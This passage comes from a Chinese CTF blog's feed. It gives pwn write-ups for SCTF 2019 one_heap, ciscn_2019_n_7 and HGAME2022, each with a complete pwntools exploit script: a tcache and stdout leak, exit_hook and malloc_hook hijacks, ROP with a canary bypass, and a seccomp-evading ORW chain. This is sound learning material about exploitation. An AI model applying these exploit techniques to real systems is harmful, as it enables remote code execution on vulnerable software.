class="params">size,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">   <span class="comment">#0</span></span><br><span class="line">   add(<span class="number">0x7F</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x7F</span>)</span><br><span class="line">   <span class="comment">#double free</span></span><br><span class="line">   delete()</span><br><span class="line">   delete()</span><br><span class="line">   <span class="comment">#1</span></span><br><span class="line">   add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">   delete()</span><br><span class="line">   <span class="comment">#2</span></span><br><span class="line">   add(<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#通过三次add，使得0x90的tcache的count变为-1</span></span><br><span class="line">   add(<span class="number">0x7F</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   add(<span class="number">0x7F</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   add(<span class="number">0x7F</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   <span class="comment">#获得unsorted bin</span></span><br><span class="line">   delete()</span><br><span class="line">   <span class="comment">#从unsorted bin里切割</span></span><br><span class="line">   <span class="comment">#低字节覆盖，使得tcache bin的next指针有一定几率(1/16)指向_IO_2_1_stdout_</span></span><br><span class="line">   add(<span class="number">0x20</span>,p16((<span class="number">0x5</span> &lt;&lt; <span class="number">0xC</span>) + (_IO_2_1_stdout_s &amp; <span class="number">0xFFF</span>)) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#取出0x90的第一个tcache chunk，同时，修改unsorted bin的size，使得chunk1被包含进来</span></span><br><span class="line">   add(<span class="number">0x7F</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#申请到IO_2_1_stdout结构体内部，低位覆盖_IO_write_base，使得puts时泄露出信息</span></span><br><span class="line">   add(<span class="number">0x7F</span>,p64(<span class="number">0x0FBAD1887</span>) +p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x58</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3E82A0</span>     </span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;                                                                                                       </span></span><br><span class="line"><span class="string">   if libc_base &gt;&gt; 40 != 0x7F:</span></span><br><span class="line"><span class="string">      raise Exception(&#x27;error leak!&#x27;)</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   malloc_hook_addr = libc_base + malloc_hook_s</span><br><span class="line">   one_gadget_addr = libc_base + one_gadget_s</span><br><span class="line">   realloc_addr = libc_base + realloc_s</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    </span><br><span class="line">   <span class="comment">#从unsorted bin里切割，尾部与chunk1的tcache bin重合，从而我们可以修改next指针</span></span><br><span class="line">   add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(malloc_hook_addr - <span class="number">0x8</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#申请到malloc_hook-0x8处</span></span><br><span class="line">   add(<span class="number">0x10</span>,p64(one_gadget_addr) + p64(realloc_addr+<span class="number">4</span>))     <span class="comment">#realloc 调栈帧</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">#get shell</span></span><br><span class="line">   add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">global</span> r</span><br><span class="line">      <span class="comment">#r = process(&#x27;./sctf_2019_one_heap&#x27;)</span></span><br><span class="line">      r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28968</span>)</span><br><span class="line">      exploit()</span><br><span class="line">      r.interactive()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      r.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;_IO_2_1_stdout leak&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUU-ciscn_2019_n_7</title>
    <link href="https://www.0wl.site/2022/02/18/BUU-ciscn-2019-n-7/"/>
    <id>https://www.0wl.site/2022/02/18/BUU-ciscn-2019-n-7/</id>
    <published>2022-02-18T02:18:13.000Z</published>
    <updated>2022-03-01T13:27:06.329Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>BUU-ciscn_2019_n_7</p></div></article><span id="more"></span><h4 id="思路">思路</h4><p>​题目有 <code>add</code>,<code>show</code>,<code>edit</code>,<code>exit</code>几个功能，输入 <code>666</code> 能够得到 <code>puts@got</code> 的地址从而得到 <code>libc</code> 基址。</p><img src="/2022/02/18/BUU-ciscn-2019-n-7/image-20220218121848568.png" class=""><p>​<code>add</code> 和 <code>edit</code> 功能中输入 <code>author name</code> 时可以覆盖下面 <code>article</code> 的地址，导致任意地址写。退出程序只能通过 <code>exit</code> 所以无法通过改返回地址 <code>get shell</code> ，可以通过 <code>exit_hook</code> 来 <code>get shell</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exit部分源码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>​<code>__run_exit_handlers</code> 里会调用 <code>_dl_fini</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_dl_fini call</span></span><br><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="comment">//_rtld_global 结构体</span></span><br></pre></td></tr></table></figure><p>​<code>__rtld_lock_unlock_recursive</code>为<code>_rtld_global</code>结构题的指针变量，修改 <code>__rtld_lock_unlock_recursive</code> 就能够实现劫持（<code>_rtld_lock_lock_recursive</code> 也行）</p><p>​<code>exit</code> 功能中有 <code>close(1)</code> ,<code>close(2)</code>关闭了输出流，只需要 <code>exec 1&gt;&amp;0</code> 将输出重定向至输入就有回显</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node4.buuoj.cn&quot;,28597)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;-&gt; \n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;Length: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;-&gt; \n&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line">    r.sendafter(<span class="string">&quot;contents:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts_got</span>():</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;-&gt; \n&quot;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;-&gt; \n&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;-&gt; \n&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got()</span><br><span class="line">puts_got = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>),<span class="number">16</span>)</span><br><span class="line">lbase = puts_got-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">onegadget = lbase + <span class="number">0xf1147</span></span><br><span class="line">exit_hook = lbase+ <span class="number">0x5f0040</span> + <span class="number">3848</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;0wl&quot;</span>)</span><br><span class="line">edit(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(exit_hook),p64(onegadget))</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考">参考</h4><ul><li><a href="https://blog.csdn.net/qq_43116977/article/details/105485947">https://blog.csdn.net/qq_43116977/article/details/105485947</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;BUU-ciscn_2019_n_7&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2022 Pwn wp</title>
    <link href="https://www.0wl.site/2022/02/18/HGAME2022-Pwn-wp/"/>
    <id>https://www.0wl.site/2022/02/18/HGAME2022-Pwn-wp/</id>
    <published>2022-02-17T17:07:32.000Z</published>
    <updated>2022-03-12T16:39:58.514Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>pwn学习</p></div></article><span id="more"></span><h2 id="week1">week1</h2><h3 id="enter-the-pwn-land">enter_the_pwn_land</h3><p>栈溢出，<code>rop</code></p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216011644574.png" class=""><p>​    栈溢出时要注意索引 i 的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./a.out&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">31098</span>)</span><br><span class="line">csu_end_addr = <span class="number">0x401306</span></span><br><span class="line">csu_front_addr = <span class="number">0x4012F0</span></span><br><span class="line">file = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">puts_got = file.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = file.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4011B6</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x401313</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">44</span> + p32(<span class="number">44</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">44</span>+p32(<span class="number">44</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(bin_sh)+p64(<span class="number">0x40101a</span>)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="enter-the-evil-pwn-land">enter_the_evil_pwn_land</h3><p>​    <a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary">https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary</a></p><p>​    跟上一题相似，同样可以栈溢出，但是开了 <code>canary</code> 保护。可溢出尺寸较大，<strong>可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过</strong></p><p>​<img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216014015718.png" class=""></p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216014153086.png" class=""><p>​<code>fsbase</code> 可以查看 <code>TLS</code> 地址，<code>fs:28h</code> 存的是 <code>canary</code>，<code>rop</code> 过程与上一题相似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&#x27;./a.out&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">37372</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401363</span></span><br><span class="line">puts_got = f.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = f.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">canary = <span class="number">0xcc432deb70d2400</span></span><br><span class="line">fake_rbp=<span class="number">0x2</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">test_thread = <span class="number">0x4011d6</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+p64(fake_rbp)</span><br><span class="line">payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(test_thread)</span><br><span class="line">payload += (<span class="number">0x838</span>-<span class="number">8</span>*<span class="number">5</span>)*<span class="string">&#x27;\x00&#x27;</span>+p64(canary)<span class="comment">#覆盖 tls 的 canary</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = lbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = lbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">one_gadget = <span class="number">0xe6c81</span></span><br><span class="line">get_shell = lbase+one_gadget</span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+p64(fake_rbp)</span><br><span class="line">payload2 += p64(get_shell)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload2 += (<span class="number">0x818</span>-<span class="built_in">len</span>(payload))*<span class="string">&#x27;\x00&#x27;</span>+p64(canary)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="oldfashion-orw">oldfashion_orw</h3><h4 id="思路">思路</h4><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216020007648.png" class=""><p>​有符号数转无符号数，输 -1 就可以溢出</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216021352712.png" class=""><p>​利用限制了沙箱机制禁用了几个函数，<code>open</code> 函数内部会调用 <code>openat</code> ，禁用 <code>openat</code> 后就不能用 <code>open</code> ，但是通过 <code>syscall</code> 构造出的 <code>open</code> 可以使用。flag 文件名是随机的，不能直接通过 orw 读出 flag，可以先利用 <code>getdents64</code> 读取文件夹内容来获得随机的 flag 文件名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getdents64</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, struct linux_dirent64 *dirp,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> &#123;</span></span><br><span class="line">               <span class="keyword">ino64_t</span>        d_ino;    <span class="comment">/* 64-bit inode number */</span></span><br><span class="line">               <span class="keyword">off64_t</span>        d_off;    <span class="comment">/* 64-bit offset to next structure */</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* Size of this dirent */</span></span><br><span class="line">               <span class="keyword">unsigned</span> <span class="keyword">char</span>  d_type;   <span class="comment">/* File type */</span></span><br><span class="line">               <span class="keyword">char</span>           d_name[]; <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line"><span class="comment">// flags 为 0x10000 是打开文件夹</span></span><br></pre></td></tr></table></figure><p>​得到随机 flag 文件名后再利用 orw 读 flag</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">43808</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">write_got = f.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = f.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = f.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end_addr = <span class="number">0x40143A</span></span><br><span class="line">csu_front_addr = <span class="number">0x401420</span></span><br><span class="line">main_addr = <span class="number">0x401311</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ret_csu(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,write_got,<span class="number">6</span>,write_got,main_addr)</span><br><span class="line">r.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">lbase = leak_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">getdents_addr = lbase+libc.sym[<span class="string">&#x27;getdents64&#x27;</span>]</span><br><span class="line">write_addr = lbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = lbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = lbase+<span class="number">0x27529</span></span><br><span class="line">pop_rdi = <span class="number">0x401443</span></span><br><span class="line">pop_rdx_rbx = lbase+<span class="number">0x162866</span></span><br><span class="line">syscall_ret = lbase+<span class="number">0x66229</span></span><br><span class="line">pop_rax = lbase+<span class="number">0x4a550</span></span><br><span class="line">sendfile_addr = lbase+libc.sym[<span class="string">&#x27;sendfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">ret_csu(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x404088</span>,<span class="number">3</span>,read_got,main_addr)    <span class="comment">#read(0,addr,7)</span></span><br><span class="line">r.send(<span class="string">&quot;./\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;size?\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0x404088</span>)+p64(pop_rsi)+p64(<span class="number">0x10000</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax)+p64(<span class="number">2</span>)+p64(ret)+p64(syscall_ret)            <span class="comment">#open(&quot;./&quot;,0x10000,0)  </span></span><br><span class="line">payload += p64(pop_rdi)+p64(<span 